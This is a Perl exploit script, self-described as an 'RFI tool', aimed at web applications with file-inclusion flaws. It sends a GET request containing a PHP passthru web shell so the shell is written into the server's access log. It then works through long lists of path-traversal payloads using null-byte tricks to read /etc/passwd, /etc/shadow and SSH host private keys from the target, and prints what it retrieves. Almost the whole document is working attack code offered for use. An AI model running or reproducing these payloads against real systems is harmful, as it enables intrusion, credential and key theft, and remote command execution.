	use LWP::UserAgent;
	use IO::Socket;
	use LWP::Simple;

	$log="../";


@apache_all=(
"../../../../../../../../../../etc/passwd%00index.html",
"../../../../../../../../../../etc/shadow%00index.html",
"../../../../../../../../../../etc/ssh/ssh_config%00index.html",
"../../../../../../../../../../etc/ssh/ssh_host_rsa_key%00index.html",
"../../../../../../../../../../etc/ssh/ssh_host_rsa_key.pub%00index.html",
"../../../../../../../../../../etc/ssh/ssh_host_dsa_key%00index.html",
"../../../../../../../../../../etc/ssh/ssh_host_dsa_key.pub%00index.html",
"../../../../../../../../../../root/proof.txt%00index.html",
"../../../../../../../../../../etc/passwd%00index.html",
"../../../../../../../../../../etc/shadow%00index.htm",
"../../../../../../../../../../etc/ssh/ssh_config%00index.htm",
"../../../../../../../../../../etc/ssh/ssh_host_rsa_key%00index.htm",
"../../../../../../../../../../etc/ssh/ssh_host_rsa_key.pub%00index.htm",
"../../../../../../../../../../etc/ssh/ssh_host_dsa_key%00index.htm",
"../../../../../../../../../../etc/ssh/ssh_host_dsa_key.pub%00index.htm",
"../../../../../../../../../../root/proof.txt%00index.htm",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/ssh/ssh_config",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/ssh/ssh_host_rsa_key",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/ssh/ssh_host_rsa_key.pub",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/ssh/ssh_host_dsa_key",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/ssh/ssh_host_dsa_key.pub",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/root/proof.txt",
"../../../../../../../../../../etc/passwd%00index.html?",
"../../../../../../../../../../etc/shadow%00index.html?",
"../../../../../../../../../../etc/ssh/ssh_config%00index.html?",
"../../../../../../../../../../etc/ssh/ssh_host_rsa_key%00index.html?",
"../../../../../../../../../../etc/ssh/ssh_host_rsa_key.pub%00index.html?",
"../../../../../../../../../../etc/ssh/ssh_host_dsa_key%00index.html?",
"../../../../../../../../../../etc/ssh/ssh_host_dsa_key.pub%00index.html?",
"../../../../../../../../../../root/proof.txt%00index.html?",
"../../../../../../../../../../etc/passwd%00index.html?",
"../../../../../../../../../../etc/shadow%00index.htm?",
"../../../../../../../../../../etc/ssh/ssh_config%00index.htm?",
"../../../../../../../../../../etc/ssh/ssh_host_rsa_key%00index.htm?",
"../../../../../../../../../../etc/ssh/ssh_host_rsa_key.pub%00index.htm?",
"../../../../../../../../../../etc/ssh/ssh_host_dsa_key%00index.htm?",
"../../../../../../../../../../etc/ssh/ssh_host_dsa_key.pub%00index.htm?",
"../../../../../../../../../../root/proof.txt%00index.htm?",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd?",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow?",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/ssh/ssh_config?",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/ssh/ssh_host_rsa_key?",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/ssh/ssh_host_rsa_key.pub?",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/ssh/ssh_host_dsa_key?",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/ssh/ssh_host_dsa_key.pub?",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/root/proof.txt?",
"../../../../../../../../../../etc/passwd%00index.html???",
"../../../../../../../../../../etc/shadow%00index.html???",
"../../../../../../../../../../etc/ssh/ssh_config%00index.html???",
"../../../../../../../../../../etc/ssh/ssh_host_rsa_key%00index.html???",
"../../../../../../../../../../etc/ssh/ssh_host_rsa_key.pub%00index.html???",
"../../../../../../../../../../etc/ssh/ssh_host_dsa_key%00index.html???",
"../../../../../../../../../../etc/ssh/ssh_host_dsa_key.pub%00index.html???",
"../../../../../../../../../../root/proof.txt%00index.html???",
"../../../../../../../../../../etc/passwd%00index.html???",
"../../../../../../../../../../etc/shadow%00index.htm???",
"../../../../../../../../../../etc/ssh/ssh_config%00index.htm???",
"../../../../../../../../../../etc/ssh/ssh_host_rsa_key%00index.htm???",
"../../../../../../../../../../etc/ssh/ssh_host_rsa_key.pub%00index.htm???",
"../../../../../../../../../../etc/ssh/ssh_host_dsa_key%00index.htm???",
"../../../../../../../../../../etc/ssh/ssh_host_dsa_key.pub%00index.htm???",
"../../../../../../../../../../root/proof.txt%00index.htm???",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd???",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow???",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/ssh/ssh_config???",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/ssh/ssh_host_rsa_key???",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/ssh/ssh_host_rsa_key.pub???",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/ssh/ssh_host_dsa_key???",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/ssh/ssh_host_dsa_key.pub???",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/root/proof.txt???",
"../../../../../../../../../../etc/passwd%00index.html%00",
"../../../../../../../../../../etc/shadow%00index.html%00",
"../../../../../../../../../../etc/ssh/ssh_config%00index.html%00",
"../../../../../../../../../../etc/ssh/ssh_host_rsa_key%00index.html%00",
"../../../../../../../../../../etc/ssh/ssh_host_rsa_key.pub%00index.html%00",
"../../../../../../../../../../etc/ssh/ssh_host_dsa_key%00index.html%00",
"../../../../../../../../../../etc/ssh/ssh_host_dsa_key.pub%00index.html%00",
"../../../../../../../../../../root/proof.txt%00index.html%00",
"../../../../../../../../../../etc/passwd%00index.html%00",
"../../../../../../../../../../etc/shadow%00index.htm%00",
"../../../../../../../../../../etc/ssh/ssh_config%00index.htm%00",
"../../../../../../../../../../etc/ssh/ssh_host_rsa_key%00index.htm%00",
"../../../../../../../../../../etc/ssh/ssh_host_rsa_key.pub%00index.htm%00",
"../../../../../../../../../../etc/ssh/ssh_host_dsa_key%00index.htm%00",
"../../../../../../../../../../etc/ssh/ssh_host_dsa_key.pub%00index.htm%00",
"../../../../../../../../../../root/proof.txt%00index.htm%00",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd%00",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow%00",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/ssh/ssh_config%00",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/ssh/ssh_host_rsa_key%00",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/ssh/ssh_host_rsa_key.pub%00",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/ssh/ssh_host_dsa_key%00",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/ssh/ssh_host_dsa_key.pub%00",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/root/proof.txt%00"
);

@apache=(
"../../../../../../../../../../etc/passwd%00index.html",
"../../../../../../../../../../etc/shadow%00index.html",
"../../../../../../../../../../etc/ssh/ssh_config%00index.html",
"../../../../../../../../../../etc/ssh/ssh_host_rsa_key%00index.html",
"../../../../../../../../../../etc/ssh/ssh_host_rsa_key.pub%00index.html",
"../../../../../../../../../../etc/ssh/ssh_host_dsa_key%00index.html",
"../../../../../../../../../../etc/ssh/ssh_host_dsa_key.pub%00index.html",
"../../../../../../../../../../root/proof.txt%00index.html",
"../../../../../../../../../../etc/passwd%00index.html",
"../../../../../../../../../../etc/shadow%00index.htm",
"../../../../../../../../../../etc/ssh/ssh_config%00index.htm",
"../../../../../../../../../../etc/ssh/ssh_host_rsa_key%00index.htm",
"../../../../../../../../../../etc/ssh/ssh_host_rsa_key.pub%00index.htm",
"../../../../../../../../../../etc/ssh/ssh_host_dsa_key%00index.htm",
"../../../../../../../../../../etc/ssh/ssh_host_dsa_key.pub%00index.htm",
"../../../../../../../../../../root/proof.txt%00index.htm",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/ssh/ssh_config",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/ssh/ssh_host_rsa_key",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/ssh/ssh_host_rsa_key.pub",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/ssh/ssh_host_dsa_key",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/ssh/ssh_host_dsa_key.pub",
"unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/root/proof.txt",
);


	my $sis="$^O";if ($sis eq 'MSWin32') { system("cls"); } else { system("clear"); }

	print "\n==========================================\n";
	print "		     RFI tool by URIX 		 \n";
	print "		   based on xps (CWH Underground)\n";
	print "		   				 \n";
	print "==========================================\n";
	
	if (@ARGV < 2)
	{
	    print "Usage: ./rfi_tool.pl <Host> <Path>\n";
	    print "Ex. ./rfi_tool.pl www.hackme.com /ktp/index.php?page=\n";
	}

	$host=$ARGV[0];
	$path=$ARGV[1];

	if ( $host   =~   /^http:/ ) {$host =~ s/http:\/\///g;}
	
	print "\nTrying to read content...\n";
	$CODE="<?php if(get_magic_quotes_gpc()){ \$_GET[cmd]=stripslashes(\$_GET[cmd]);} passthru(\$_GET[cmd]);?>";
	$socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$host", PeerPort=>"80") or die "Could not connect to host.\n\n";
	print $socket "GET /cwhunderground "."\#\#%\$\$%\#\#".$CODE."\#\#%\$\$%\#\#"." HTTP/1.1\r\n";
	print $socket "Host: ".$host."\r\n";
	print $socket "Connection: close\r\n\r\n";
	close($socket);
	
	if ( $host   !~   /^http:/ ) {$host = "http://" . $host;}
	
	foreach $getlog(@apache)
                {
                  chomp($getlog);
		  $find= $host.$path.$getlog."%00";
                  $xpl = LWP::UserAgent->new() or die "Could not initialize browser\n";
		  $req = HTTP::Request->new(GET => $find);
		  $res = $xpl->request($req);
		  $info = $res->content;
if ( index($info, 'html' ) == -1) {
print "Reading ".$getlog."\n";
print $info;}
                }
	